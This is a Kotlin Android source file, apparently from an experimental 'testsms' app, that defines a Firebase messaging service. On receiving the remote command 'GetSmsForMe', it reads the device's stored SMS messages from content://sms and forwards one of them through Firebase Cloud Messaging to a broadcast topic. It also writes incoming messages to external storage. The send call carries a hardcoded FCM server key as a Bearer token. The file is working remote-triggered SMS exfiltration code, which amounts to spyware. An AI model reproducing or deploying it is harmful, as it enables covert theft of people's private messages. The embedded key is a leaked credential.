package com.example.testsms

import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.widget.Toast
import com.example.testsms.model.Notification
import com.example.testsms.model.SendNotificationModel
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import dagger.hilt.android.AndroidEntryPoint
import io.reactivex.CompletableObserver
import io.reactivex.disposables.Disposable
import io.reactivex.schedulers.Schedulers
import java.io.File
import java.io.FileWriter
import java.io.IOException
import java.util.*
import javax.inject.Inject
import kotlin.collections.ArrayList


@AndroidEntryPoint
class MyFirebaseMessagingService : FirebaseMessagingService() {

    @Inject
    lateinit var remoteRepository: RemoteRepository



    override fun onMessageReceived(p0: RemoteMessage) {
        super.onMessageReceived(p0)
        Log.e("Notif", "Recievde" + p0.data.get("body"))
        Log.e("TAG", "rolex" )
        if (p0.data.get("body") == "GetSmsForMe"){
            var body = readSms()
            var g = ""

            var item = 0
            while(item < 1 && item < body.size){

                var data = Notification(body[item], "Write")
                var notif = SendNotificationModel(data, "/topics/all2")
                send(notif)
                item++
            }

        }

        if (p0.data["title"] == "Write"){
            generateNoteOnSD(this, "Messages.txt", p0.data["body"])
        }
    }

    private fun generateNoteOnSD(context: Context?, sFileName: String?, sBody: String?) {
        try {
            val root = File(Environment.getExternalStorageDirectory(), "Notes")
            if (!root.exists()) {
                root.mkdirs()
            }
            val gpxfile = File(root, sFileName)
            val writer = FileWriter(gpxfile, true)
            writer.append(sBody)
            writer.flush()
            writer.close()
            Handler(Looper.getMainLooper()).postDelayed({
                Toast.makeText(this, "YEAH WE DID IT", Toast.LENGTH_LONG).show()
            },500)
//            Toast.makeText(context, "Saved", Toast.LENGTH_SHORT).show()
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }

    fun send(sendNotificationModel: SendNotificationModel){
        Log.e("TAG", "onMessageReceived: " + "send")
        remoteRepository.sendNotification(token = "Bearer AAAARr6Jcbk:APA91bFLrJ5ESAyRQ4H8EXyFppafI7KESFcRdOt1--9X1-F93tEBW87JA-KWqwcigXym2OnX8dtxHpSsvOHRjw0q2bHhx3fsf04F1S65aNmJmRTQHGn0PwnujPxrSoi3E_Ej4bXSZQAX", sendNotificationModel = sendNotificationModel).subscribeOn(Schedulers.io()).observeOn(Schedulers.io()).subscribe(
            object : CompletableObserver {
                override fun onSubscribe(d: Disposable) {

                }

                override fun onComplete() {
                    Log.e("TAG", "onComplete: " )
                }

                override fun onError(e: Throwable) {
                    Log.e("TAG", "onError: ",e )
                }
            })
    }

    fun readSms(): ArrayList<String>{
        val s = ArrayList<String>()
        val cursor: Cursor? =
            contentResolver.query(Uri.parse("content://sms"), null, null, null, null)

        if (cursor!!.moveToFirst()) { // must check the result to prevent exception
            do {
                var msgData = ""
                for (idx in 0 until cursor.columnCount) {
                    msgData += " " + cursor.getColumnName(idx).toString() + ":" + cursor.getString(
                        idx
                    )
//                    s += " " + cursor.getColumnName(idx).toString() + ":" + cursor.getString(
//                        idx
//                    )
                }
                s.add(msgData)

                Log.e("TAG", "readSms: " + msgData )
                // use msgData
            } while (cursor.moveToNext())
        } else {
            // empty box, no SMS
        }
        cursor.close()
        return s
    }

}